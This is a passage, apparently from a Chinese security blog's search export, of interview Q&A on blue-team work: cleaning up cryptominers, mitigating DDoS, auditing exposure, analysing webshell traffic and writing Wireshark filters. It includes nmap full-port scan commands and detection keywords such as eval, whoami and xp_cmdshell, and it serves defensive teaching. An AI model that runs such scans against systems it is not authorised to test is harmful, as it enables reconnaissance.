。</p></li><li><p>防钓鱼：不要点击来源不明的邮件以及附件，钓鱼邮件是勒索病毒的重要传播源。</p></li></ol></li></ol><h2 id="如何排查常见挖矿木马"><a href="#如何排查常见挖矿木马" class="headerlink" title="如何排查常见挖矿木马"></a>如何排查常见挖矿木马</h2><ol><li>系统响应缓慢</li><li>CPU&#x2F;显卡使用率过高</li><li>内存&#x2F;带宽占用高</li></ol><p>登录进可疑主机后，可以通过以下方式确认挖矿木马：</p><ol><li>查看进程（系统命 ps、ls 令有可能被替换）</li><li>检查日志、检查系统用户</li><li>发现异常文件</li></ol><h2 id="ddos-攻击如何去防范"><a href="#ddos-攻击如何去防范" class="headerlink" title="ddos 攻击如何去防范"></a>ddos 攻击如何去防范</h2><p>目前对于低网络层的 DDoS 攻击有一些有效的防护手段，如丢弃第一次 SYN 包，上流量防护设备，上 WAF 封禁地址等。<br>比较难缠的是第七层，第八层的 CC 攻击，它会找到目标网站上比较消耗资源的关键位置，重复发起攻击以消耗 CPU&#x2F;内存&#x2F;数据库 IO 等资源，目前的应付手段有：优化资源消耗高位置的代码，增加硬件设备，上云，购买专业安全公司的安全服务。<br>除此之外，隐藏服务器的真实 IP、上云 WAF、CDN、负载均衡等设备，或者暂时将域名解析到公安网警网站等 也是可以作为选择方案。</p><h2 id="如何清查互联网暴露面"><a href="#如何清查互联网暴露面" class="headerlink" title="如何清查互联网暴露面"></a>如何清查互联网暴露面</h2><p>对于客户不清楚自己是否还有其他互联网暴露面的时候，需要先将客户已知的资产清单收集起来，方便后续对比。<br>对于公网暴露面：在出口网关设置流量监控工具（wireshark 或者自带防火墙），检测足够长的时间以获得可能存在的暴露 IP 地址 nmap 公网扫描全端口走一波，然后对照已知资产清单即可。<br>nmap 全端口扫描命令：nmap -sV -n -Pn -p- -iL ip.txt -oA OUTPUT –no-stylesheet –min-rate 5000 –max-retries 3<br>未认领的资产进行下线关停处理。</p><h2 id="如何开展扫描任务"><a href="#如何开展扫描任务" class="headerlink" title="如何开展扫描任务"></a>如何开展扫描任务</h2><p>题目描述：某专业公司 A 公司安全项目，跟专业公司 A 谈妥后完成了外网扫描任务，现在进行内网扫描。由于业务量比较大安排在晚上下班后进行扫描。第一天扫描晚上 9 点由于不明原因导致 A 专业公司所有系统无法访问，被专业公司 A 的人询问情况，第二天检查原因发现，是因为所有流量是经过 VPN 到达主机，导致进出口 VPN 网关堵塞，业务无法正常访问，请问被专业公司 A 的人询问情况如何应急处理？判断原因并说明后续如何开展扫描任务？<br>首先调解客户情绪，跟客户沟通，立马停止扫描以恢复业务系统正常，并告知 A 公司进行排查原因，检查网络与主机情况。<br>其次考察网络知识，既然流量通过 VPN 会进行堵塞，想办法绕过此 VPN 或者降速，这里要求提供内网扫描机器进行扫描即可，但需要吸取上次经验扫描前进行扫描测试，如在中午休息的时候进行探测性扫描，测压。然后在晚上再进行扫描，扫描时需要 A 公司派网管人员帮忙查看系统状况是否正常。</p><h2 id="客户并想要我方帮忙修复漏洞，此场景怎么处理"><a href="#客户并想要我方帮忙修复漏洞，此场景怎么处理" class="headerlink" title="客户并想要我方帮忙修复漏洞，此场景怎么处理"></a>客户并想要我方帮忙修复漏洞，此场景怎么处理</h2><p>题目描述：扫描任务结束后将结果发给 A 公司，A 公司对其中的一类型漏洞表示疑惑：认为自己没有办法修复此类漏洞（比较积极的专业公司），向我方询问，并想要我方帮忙修复漏洞。此场景应该怎么处理？<br>考察责任划分问题，原则上是不允许直接操作客户公司的机器，以及对于客户机器权限需要特别谨慎对待，我们负责解释漏洞这方面的事宜，并且积极的提供整改建议，并不能直接或者间接操作客户机器。<br>其次考验客户想让我们直接修复漏洞的处理方式，这种情况会经常出现在我们的日常工作中，我们要说明职责范围：我们只负责解释漏洞描述和原理以及修复建议，他们负责整改，我们对系统业务不熟悉，我们亲自修复话出现风险和问题也是我们承担不了的。</p><h2 id="安全任务结束后我司发结果给客户时，遗漏了某个漏洞，如何给客户解释处理"><a href="#安全任务结束后我司发结果给客户时，遗漏了某个漏洞，如何给客户解释处理" class="headerlink" title="安全任务结束后我司发结果给客户时，遗漏了某个漏洞，如何给客户解释处理"></a>安全任务结束后我司发结果给客户时，遗漏了某个漏洞，如何给客户解释处理</h2><p>题目描述：安全任务结束后，发还结果给 A 公司，A 公司经过检查后发现某个漏洞没有出现在结果里，被遗漏了。经检查后发现确实是我方当时没有扫描出来，如何跟客户解释和处理？<br>先确认该漏洞是否存在<br>如果漏洞存在：也就是我们没扫出来，就需要检查当时资产是否有活，是不是关停又开起来，是不是因为当时网络不好，带宽不够大，网络波动大，外网环境不稳定、WAF 拦截等，先稳住客户情绪，让客户相信我们是有能力的，只是偶尔因为不可控因素出现了问题，然后提供补救方案，进行补扫等后续方案<br>如果漏洞扫不出来：换个扫描器，比较差异，如果还是扫不出来的话，就要考虑优化方案，看要不要立个专项检测来单独对此漏洞进行批量排查。如果实在是我们的问题，找不到理由圆场的话，我们就老实承认，找客户经理进行沟通，提出不足并且要有改进的方案等，考虑如何给客户一个满意的交代，确保下次不会再出现此类问题。</p><h2 id="服务器被挖矿的原因"><a href="#服务器被挖矿的原因" class="headerlink" title="服务器被挖矿的原因"></a>服务器被挖矿的原因</h2><p>为了追求高效率，现在的黑客一般都是通过自动化脚本去扫描互联网上所有机器，寻找漏洞然后部署挖矿进程。所以大部分的挖矿都是由于受害者的主机上存在常见的漏洞。比如：<br>1）未授权访问或弱口令：Redis 未授权访问、Docker API 未授权访问、Hadoop Yarn 未授权访问、NFS 未授权访问、Rsync 弱口令、PostgreSQL 弱口令、Tomcat 弱口令、SSH 弱口令、Telnet 弱口令、Windows 远程桌面弱口令；<br>2）远程命令执行漏洞：WebLogic XML 反序列化漏洞、Jenkins 反序列化、Jboss 远程代码执行、Spring 远程代码执行、ElasticSearch 命令执行、永恒之蓝、Struts2 系列漏洞、常见 CMS 的远程命令执行漏洞；<br>3）新爆的高危漏洞：一般每次爆发新的高危漏洞，都会紧跟一波大规模的全网扫描利用和挖矿。<br>一旦发现服务器被挖矿，应该首先查看挖矿进程所属的用户，根据挖矿进程的运行用户去排查该用户下是否还运行着其它进程，确定这些进程是否有上述经常被黑客利用的漏洞。如果有常见的漏洞，则应该重点对此进行排查。</p><h2 id="如何清除挖矿木马"><a href="#如何清除挖矿木马" class="headerlink" title="如何清除挖矿木马"></a>如何清除挖矿木马</h2><p>1）及时隔离主机<br>部分带有蠕虫功能的挖矿木马在取得本机的控制权后，会以本机为跳板机，对同一局域网内的其他主机进行已知漏洞的扫描和进一步利用，所以发现挖矿现象后，在不影响业务的前提下应该及时隔离受感染主机，然后进行下一步分析。</p><p>2）阻断与矿池通讯<br>iptables -A INPUT -s xmr.crypto-pool.fr -j DROP<br>iptables -A OUTPUT -d xmr.crypto-pool.fr -j DROP</p><p>3）清除定时任务<br>大部分挖矿进程会在受感染主机中写入定时任务完成程序的驻留，当安全人员只清除挖矿木马时，定时任务会再次从服务器下载挖矿进程或直接执行挖矿脚本，导致挖矿进程清除失败。</p><p>4）清除启动项<br>有的挖矿进程为了实现长期驻留，会向系统中添加启动项来确保系统重启后挖矿进程还能重新启动。所以在清除时还应该关注启动项中的内容，如果有可疑的启动项，也应该进行排查，确认是挖矿进程后，对其进行清除。</p><p>5）清除公钥文件<br>在用户家目录的 .ssh 目录下放置 authorized_keys 文件，从而免密登录该机器也是一种常见的保持服务器控制权的手段。在排查过程中应该查看该文件中是否有可疑公钥信息，有的话直接删除，避免攻击者再次免密登录该主机。</p><p>6）kill 挖矿进程<br>对于单进程挖矿程序，直接结束挖矿进程即可。但是对于大多数的挖矿进程，如果挖矿进程有守护进程，应先杀死守护进程再杀死挖矿进程，避免清除不彻底。在实际的清除工作中，应找到本机上运行的挖矿脚本，根据脚本的执行流程确定木马的驻留方式，并按顺序进行清除，避免清除不彻底。</p><h2 id="1、Webshell-流量交互的流量特征有哪些"><a href="#1、Webshell-流量交互的流量特征有哪些" class="headerlink" title="1、Webshell 流量交互的流量特征有哪些"></a>1、Webshell 流量交互的流量特征有哪些</h2><ol><li>Webshell 是用来控制服务器的，在控制服务器的过程中，就会触发许多系统函数，例如 eval、z0（菜刀特征）、shell，需监控这些关键的函数，具体需要查看是哪个网页发起的请求进行鉴别。</li><li>Webshell 连接可能使用 base64 编码，正常功能也会使用 base64 容易引起误报，一般与 eval 数量对比，数量差异较小时可能被上传 webshell 进行编码通讯。</li><li>除了系统函数、base64 编码通讯外，还存在 int_set(“display_errors”,”0”)，为 Webshell 流量特征之一。</li><li>还可以监控 ifconfig whoami ipconfig 等关键命令，这是获得 Webshell 后基本上都会执行的命令。</li></ol><h2 id="批量检查-http-服务使用什么工具和简略使用步骤"><a href="#批量检查-http-服务使用什么工具和简略使用步骤" class="headerlink" title="批量检查 http 服务使用什么工具和简略使用步骤"></a>批量检查 http 服务使用什么工具和简略使用步骤</h2><p>方法一：直接使用 nmapSV.py 工具即可，用法为 python3 nmapSV.py ip.txt result.txt<br>方法二：使用 nmap 工具扫描，带上 -sV 参数进行版本识别即可，将待检测的 IP 地址&#x2F;地址段添加进 ip.txt 文件中。使用命令 nmap -sV -iL ip.txt -oA OUTPUT –no-stylesheet，扫出来的结果导出 nmap 文件，使用 nmapReport 工具得出结果。</p><h2 id="存活性探测的简要步骤"><a href="#存活性探测的简要步骤" class="headerlink" title="存活性探测的简要步骤"></a>存活性探测的简要步骤</h2><p>使用 nmap 工具进行存活性探测 使用 nmap，命令 nmap -sP -n -iL ip.txt -oA OUTPUT –no-stylesheet<br>在 Linux 中使用 cat OUTPUT.gnmmap |grep Up |awk ‘{print $2}’ &gt; ip.cunhuo.txt 即可得到存活 IP</p><h2 id="假设发现数据库短时间内查询异常次数增多，描述-sql-查询异常流量分析的思路"><a href="#假设发现数据库短时间内查询异常次数增多，描述-sql-查询异常流量分析的思路" class="headerlink" title="假设发现数据库短时间内查询异常次数增多，描述 sql 查询异常流量分析的思路"></a>假设发现数据库短时间内查询异常次数增多，描述 sql 查询异常流量分析的思路</h2><p>数据库短时间内查询增多有可能遭遇到了扫描或者 sql 注入测试，可以结合流量分析工具进行研判。<br>select 和 union 为数据库查询语句特征，当这两者数量出现次数较多而且差异较小可能存在 SQL 注入漏洞或正在被扫描器扫描，可监控这两个关键字，但还需要进一步查看具体请求参数。如：<br>1）使用 wireshark 打开抓取后的流量包<br>2）对于抓取到的数据包筛选出 HTTP 协议包，在统计处筛选出短时间内流量较大的 IP</p><h2 id="描述流量分析溯源的思路"><a href="#描述流量分析溯源的思路" class="headerlink" title="描述流量分析溯源的思路"></a>描述流量分析溯源的思路</h2><p>假设发现 web 应用服务器发现文件异常增多，初步怀疑被上传 webshell，描述流量分析溯源的思路<br>可利用流量工具进行溯源：<br>1）查看 eval、z0、shell、whoami 等关键字，查看出现次数过多的时候，可能需要查看是哪个页面发起的请求，有可能是 webshell<br>2）通过 WireShark 工具快速搜索关键字，定位到异常流量包<br>3）找出异常 IP 和所上传的内容，查看是否为 webshell</p><p>如何定位到攻击 IP：<br>1）首先通过选择-统计-对话查看流量的走向情况，定位可疑的 IP 地址<br>2）根据定位到的 IP 地址，尝试对上传的 webshell 进行定位 ip.addr &#x3D;&#x3D; ip &amp;&amp; http matches “upload||eval|select|xp_cmdshell” &amp;&amp; http.request.method &#x3D;&#x3D; “POST”<br>3）查找到 Webshell 后尝试溯源漏洞位置，http.request.uri contains “webshell.php”，定位到最开始 webshell 执行或上传的时候<br>4）根据最开始的 HTTP 上传包或者其他漏洞特产定位漏洞类型</p><h2 id="wireshark-简单的过滤规则"><a href="#wireshark-简单的过滤规则" class="headerlink" title="wireshark 简单的过滤规则"></a>wireshark 简单的过滤规则</h2><p>过滤 ip：过滤源 ip 地址：ip.src&#x3D;&#x3D;1.1.1.1；目的 ip 地址：ip.dst&#x3D;&#x3D;1.1.1.1；<br>过滤端口：过滤 80 端口 tcp.port&#x3D;&#x3D;80，源端口：tcp.srcport&#x3D;&#x3D;80，目的端口：tcp.dstport&#x3D;&#x3D;80<br>协议过滤：直接输入协议名即可，如 http 协议 http<br>http 模式过滤：过滤 get&#x2F;post 包 http.request.method&#x3D;&#x3D;”GET&#x2F;POST”</p><h2 id="客户给到你有-50-万个-ip，要求你两周内做完全端口扫描，你会怎么做"><a href="#客户给到你有-50-万个-ip，要求你两周内做完全端口扫描，你会怎么做" class="headerlink" title="客户给到你有 50 万个 ip，要求你两周内做完全端口扫描，你会怎么做"></a>客户给到你有 50 万个 ip，要求你两周内做完全端口扫描，你会怎么做</h2><p>从两方面回答：<br>1）如何对客户要求做出解释并合理调整<br>2）如何提高全端口扫描效率，既保证速度，又保证准确率。</p><p>首先客户提出两周 50w 个 ip 全端口这个肯定不现实，所以要考虑跟客户解释，有必要对扫描任务进行时间调整，安排尽可能多的扫描资源，如扫描机器，扫描网络带宽等，参考扫描 100 个 IP 端口的平均时长，估计扫完的时间，给出 30 天时间左右答复，并且留出一周进行后续补扫，文档整理等。<br>使用到多线程、分布式和高并发，采用 masscan + nmap，先 masscan 存活过一遍，把未存活 IP 剔除掉；使用分布式 nmap 高并发发过一遍端口，也可以 masscan 端口扫描过一遍，在 nmap 进行探测<br>由于 IP 数量过多，不能直接把所有的 IP 都丢上去扫，时间肯定不够可以跟客户商量减少 IP 数量，对未存活的 IP 进行筛选过滤，加快扫描速度需要进行参数微调，如 –min-hostgroup、–min-rate 和 –min-parallelism。对于存在防火墙的情况，可以提出需要提供扫描器<br>数据整理：对于大量的 list 和 json 使用 python-nmap python-masscan，扫描 1 个 IP 处理 1 个 IP</p><h2 id="常见的取证分析工具"><a href="#常见的取证分析工具" class="headerlink" title="常见的取证分析工具"></a>常见的取证分析工具</h2><p>Wireshark、xplico、Volatility、FastIR Collector、Autopsy、DumpIt、FTK Imager、Foremost、Scalpel、Bulk_extractor 等。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
